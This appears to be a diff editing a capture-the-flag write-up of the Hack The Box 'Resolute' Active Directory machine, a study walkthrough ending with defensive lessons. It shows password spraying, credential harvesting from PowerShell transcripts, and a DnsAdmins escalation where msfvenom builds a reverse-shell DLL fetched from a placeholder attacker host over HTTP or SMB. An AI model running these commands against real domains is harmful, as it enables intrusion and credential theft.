@@ -1,11 +1,12 @@
 ---
 title: "Hack The Box - Resolute - Writeup"
-description: "Active Directory enumeration, password spraying, WinRM access, PowerShell transcript credential discovery, and DnsAdmins privilege escalation on HackTheBox Resolute."
+description: "Active Directory enumeration, password spraying, WinRM access, PowerShell transcript credential discovery, and DnsAdmins privilege escalation on Hack The Box Resolute."
 
 image: "/images/resolute.png"
 draft: false
 difficulty: Medium
 platform: HackTheBox
+
 tags:
   - HackTheBox
   - Windows
@@ -27,7 +28,7 @@ ShowBreadCrumbs: false
 
 # Overview
 
-Resolute is a beginner-friendly Active Directory machine focused on LDAP/RPC enumeration, password spraying, credential discovery, WinRM access, and DnsAdmins privilege escalation.
+Resolute is a beginner-friendly Active Directory machine focused on RPC enumeration, password spraying, credential discovery, WinRM access, and DnsAdmins privilege escalation.
 
 The machine demonstrates how weak operational security and dangerous delegated privileges can eventually lead to full SYSTEM compromise on a Domain Controller.
 
@@ -35,27 +36,29 @@ The machine demonstrates how weak operational security and dangerous delegated p
 
 # Skills & Concepts
 
-- LDAP Enumeration
-- RPC Enumeration
-- Password Spraying
-- WinRM Access
-- PowerShell Transcript Analysis
-- Credential Harvesting
-- DnsAdmins Abuse
-- DLL Injection
-- Active Directory Privilege Escalation
+* Active Directory Enumeration
+* RPC Enumeration
+* Password Spraying
+* WinRM Access
+* PowerShell Transcript Analysis
+* Credential Harvesting
+* DnsAdmins Abuse
+* DLL Injection
+* Active Directory Privilege Escalation
 
 ---
 
 # Tools Used
 
-- Nmap
-- enum4linux
-- rpcclient
-- CrackMapExec
-- Evil-WinRM
-- msfvenom
-- dnscmd
+* Nmap
+* rpcclient
+* enum4linux
+* CrackMapExec
+* Evil-WinRM
+* msfvenom
+* Impacket SMB Server
+* dnscmd
+* Netcat
 
 ---
 
@@ -63,7 +66,7 @@ The machine demonstrates how weak operational security and dangerous delegated p
 
 ## Nmap Scan
 
-Initial scan:
+Initial service enumeration:
 
 ```bash
 nmap -sC -sV -oA nmap/initial 10.10.10.169
@@ -82,28 +85,28 @@ Results:
 3268/tcp  open  ldap
 ```
 
-The machine appeared to be a Domain Controller.
+The exposed services strongly suggested that the target was functioning as a Domain Controller.
 
 Important observations:
 
-- LDAP exposed
-- Kerberos enabled
-- SMB accessible
-- WinRM available
+* LDAP exposed
+* Kerberos enabled
+* SMB accessible
+* WinRM available
 
 ---
 
 # RPC Enumeration
 
-Anonymous enumeration was possible using RPC.
+Anonymous RPC enumeration was permitted on the target.
 
-Using rpcclient:
+Using `rpcclient`:
 
 ```bash
 rpcclient -U "" -N 10.10.10.169
 ```
 
-Inside rpcclient:
+Inside `rpcclient`:
 
 ```bash
 enumdomusers
@@ -111,7 +114,7 @@ enumdomusers
 
 This revealed multiple valid domain usernames.
 
-Alternative enumeration:
+Alternative enumeration could also be performed using:
 
 ```bash
 enum4linux 10.10.10.169
@@ -121,7 +124,7 @@ enum4linux 10.10.10.169
 
 # Credential Discovery
 
-During LDAP/RPC enumeration, a password was discovered inside a user description field.
+During RPC enumeration, a password was discovered inside a user's description field.
 
 Example:
 
@@ -130,15 +133,16 @@ Password: Welcome123!
 ```
 
 This simulated a common enterprise mistake involving:
-- temporary onboarding passwords
-- helpdesk notes
-- poor credential handling
+
+* temporary onboarding passwords
+* helpdesk notes
+* insecure credential management
 
 ---
 
 # Password Spraying
 
-Using CrackMapExec:
+After collecting valid usernames, password spraying was performed using CrackMapExec.
 
 ```bash
 crackmapexec smb 10.10.10.169 -u users.txt -p 'Welcome123!'
@@ -160,13 +164,13 @@ Using Evil-WinRM:
 evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'
 ```
 
-Successful authentication granted PowerShell shell access.
+Successful authentication granted PowerShell access to the target system.
 
 ---
 
 # User Flag
 
-Navigate to desktop:
+Navigating to the user's desktop:
 
 ```powershell
 cd C:\Users\melanie\Desktop
@@ -177,13 +181,13 @@ type user.txt
 
 # Local Enumeration
 
-Searching for interesting files:
+Searching the file system for interesting files:
 
 ```powershell
 Get-ChildItem -Path C:\ -Include *.txt,*.log -File -Recurse -ErrorAction SilentlyContinue
 ```
 
-PowerShell transcript logs were discovered.
+PowerShell transcript logs were discovered during enumeration.
 
 Interesting directories included:
 
@@ -195,7 +199,7 @@ C:\PSTranscripts
 
 # Credential Harvesting
 
-Inside transcript logs:
+Inside the transcript logs, another set of credentials was discovered:
 
 ```text
 net use \\server /user:MEGABANK\ryan Serv3r4Admin4cc123!
@@ -211,11 +215,13 @@ ryan:Serv3r4Admin4cc123!
 
 # Lateral Movement
 
-Authenticating as ryan:
+Authenticating as `ryan`:
 
 ```bash
 evil-winrm -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'
 ```
+
+Successful authentication provided access to a more privileged user account.
 
 ---
 
@@ -223,7 +229,7 @@ evil-winrm -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'
 
 ## Group Enumeration
 
-Checking privileges:
+Checking group memberships:
 
 ```powershell
 whoami /groups
@@ -235,44 +241,40 @@ Interesting group membership discovered:
 DnsAdmins
 ```
 
-Members of DnsAdmins can configure the DNS service to load arbitrary DLLs.
-
-This allowed SYSTEM-level code execution.
+Members of the `DnsAdmins` group can configure the DNS service to load arbitrary DLLs, allowing SYSTEM-level code execution.
 
 ---
 
 # Malicious DLL Generation
 
-Using msfvenom:
+Generating a malicious DLL using `msfvenom`:
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f dll -o evil.dll
-```
-
-Hosting the DLL:
-
-```bash
-python3 -m http.server 80
+msfvenom -p windows/x64/shell_reverse_tcp \
+LHOST=YOUR_IP \
+LPORT=4444 \
+-f dll \
+-o evil.dll
 ```
 
 ---
 
-# DLL Delivery
+# SMB Share Hosting
 
-Downloading the DLL onto the target:
+The malicious DLL was hosted using Impacket SMB Server:
 
-```powershell
-Invoke-WebRequest http://YOUR_IP/evil.dll -OutFile C:\Temp\evil.dll
+```bash
+impacket-smbserver share ./
 ```
 
 ---
 
 # DNS Plugin Abuse
 
-Configuring the DNS service plugin DLL:
+Configuring the DNS service to load the malicious DLL from the SMB share:
 
 ```powershell
-dnscmd localhost /config /serverlevelplugindll C:\Temp\evil.dll
+dnscmd localhost /config /serverlevelplugindll \\YOUR_IP\share\evil.dll
 ```
 
 Expected output:
@@ -299,7 +301,7 @@ sc.exe stop dns
 sc.exe start dns
 ```
 
-When the DNS service loaded the malicious DLL, a SYSTEM shell was obtained.
+Once the DNS service loaded the malicious DLL, a SYSTEM shell was obtained.
 
 ---
 
@@ -315,7 +317,9 @@ type root.txt
 # Attack Path Summary
 
 ```text
-RPC/LDAP Enumeration
+RPC Enumeration
+        ↓
+User Enumeration
         ↓
 Password Discovery
         ↓
@@ -340,19 +344,22 @@ SYSTEM Shell
 
 # Lessons Learned
 
-Resolute is an excellent beginner Active Directory machine because it introduces:
+Resolute is an excellent beginner Active Directory machine because it introduces several important concepts:
 
-- LDAP and RPC enumeration
-- password spraying
-- PowerShell credential discovery
-- WinRM abuse
-- delegated privilege escalation
-- DnsAdmins exploitation
+* RPC enumeration
+* password spraying
+* PowerShell transcript credential discovery
+* WinRM abuse
+* delegated privilege escalation
+* DnsAdmins exploitation
 
 while remaining approachable for newcomers to Windows domain exploitation.
 
-It also reinforces the importance of:
-- secure credential management
-- auditing privileged groups
-- restricting administrative capabilities
-- monitoring PowerShell activity inside enterprise environments.
+The machine also reinforces the importance of:
+
+* secure credential management
+* auditing privileged groups
+* restricting administrative capabilities
+* monitoring PowerShell activity inside enterprise environments
+
+---
